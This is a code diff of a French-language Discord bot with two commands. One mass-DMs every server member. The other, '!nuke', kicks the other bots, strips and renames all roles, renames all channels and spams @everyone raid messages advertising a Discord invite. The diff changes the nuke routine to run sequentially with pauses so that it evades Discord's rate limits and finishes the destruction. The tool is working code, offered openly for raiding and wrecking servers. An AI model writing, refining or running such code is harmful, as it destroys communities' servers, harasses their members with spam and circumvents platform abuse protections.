@@ -21,7 +21,7 @@ const client = new Client({
 const OWNERS = ['1166445202148442112', '330080470983245824'];
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Mode Godmode activé.`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
 });
 
 // ==========================================
@@ -41,7 +41,7 @@ client.on('messageCreate', async message => {
     const isOwner = OWNERS.includes(message.author.id);
 
     // ==========================================
-    // 1. COMMANDE !DMALL (Vitesse Turbo Maximale : 50ms)
+    // 1. COMMANDE !DMALL
     // ==========================================
     if (message.content === '!dmall') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
@@ -84,7 +84,7 @@ client.on('messageCreate', async message => {
                 if (interaction.customId === 'confirm_dmall') {
                     await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });
 
-                    const statusMsg = await message.channel.send({ content: "📊 Envoi en cours à vitesse maximale..." });
+                    const statusMsg = await message.channel.send({ content: "📊 Envoi en cours..." });
 
                     try {
                         await message.guild.members.fetch();
@@ -94,7 +94,6 @@ client.on('messageCreate', async message => {
                         let successCount = 0;
                         let failCount = 0;
 
-                        // Envoi ultra-rapide à 50ms par message
                         for (const [id, member] of members) {
                             try {
                                 const finalMessage = messageTemplate
@@ -106,7 +105,7 @@ client.on('messageCreate', async message => {
                             } catch (err) {
                                 failCount++;
                             }
-                            await new Promise(resolve => setTimeout(resolve, 50)); 
+                            await new Promise(resolve => setTimeout(resolve, 100)); 
                         }
 
                         await statusMsg.edit({ content: `✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})` });
@@ -122,54 +121,50 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 2. COMMANDE !NUKE (Godmode Total : Rôles + Salons + Bots + Pings)
+    // 2. COMMANDE !NUKE (Corrigée contre le rate-limit)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-        await message.reply("💥 **[NUKE GODMODE]** Destruction totale et instantanée du serveur en cours...");
+        await message.reply("💥 **[NUKE GODMODE]** Destruction du serveur en cours...");
 
         try {
-            // 1. Tenter de placer le bot tout en haut de la hiérarchie des rôles
-            const botMember = await message.guild.members.fetchMe().catch(() => {});
-            if (botMember && botMember.roles) {
-                const highestRole = message.guild.roles.highest;
-                await botMember.setHighestRole(highestRole).catch(() => {});
+            // 1. Kicker les autres bots
+            const members = await message.guild.members.fetch();
+            for (const [id, m] of members) {
+                if (m.user.bot && m.id !== client.user.id) {
+                    await m.kick('Nuke Godmode').catch(() => {});
+                    await new Promise(res => setTimeout(res, 100));
+                }
             }
 
-            // 2. Kicker tous les autres bots présents sur le serveur instantanément
-            const members = await message.guild.members.fetch();
-            members.forEach(async m => {
-                if (m.user.bot && m.id !== client.user.id) {
-                    await m.kick('Nuke Godmode - Suppression des bots').catch(() => {});
-                }
-            });
-
-            // 3. Strip les permissions et renommer TOUS les rôles en "ez by k2l"
+            // 2. Renommer et strip les rôles un par un avec une petite pause
             const roles = message.guild.roles.cache;
-            roles.forEach(async role => {
-                // Ne pas toucher au rôle @everyone de base pour éviter les erreurs bloquantes de l'API, ni au rôle du bot
+            for (const [id, role] of roles) {
                 if (role.id !== message.guild.id && !role.managed) {
                     await role.edit({
                         name: 'ez by k2l',
-                        permissions: new PermissionsBitField(0n) // Enlève toutes les perms
+                        permissions: new PermissionsBitField(0n)
                     }).catch(() => {});
+                    await new Promise(res => setTimeout(res, 150));
                 }
-            });
+            }
 
-            // 4. Renommer les salons et balancer le spam en même temps
+            // 3. Renommer les salons et balancer les pings proprement
             const channels = message.guild.channels.cache;
-
-            channels.forEach(async channel => {
+            for (const [id, channel] of channels) {
                 await channel.setName('ez-by-graveuhq').catch(() => {});
+                await new Promise(res => setTimeout(res, 100));
 
                 if (channel.isTextBased()) {
                     for (let i = 0; i < 10; i++) {
                         await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
-                        await new Promise(resolve => setTimeout(resolve, 20)); // Vitesse extrême
+                        await new Promise(res => setTimeout(res, 200)); // Pause anti-spam API Discord
                     }
                 }
-            });
+            }
+
+            await message.channel.send("💥 **[NUKE]** Serveur complètement détruit avec succès !");
 
         } catch (error) {
             console.error("Erreur critique Nuke :", error);
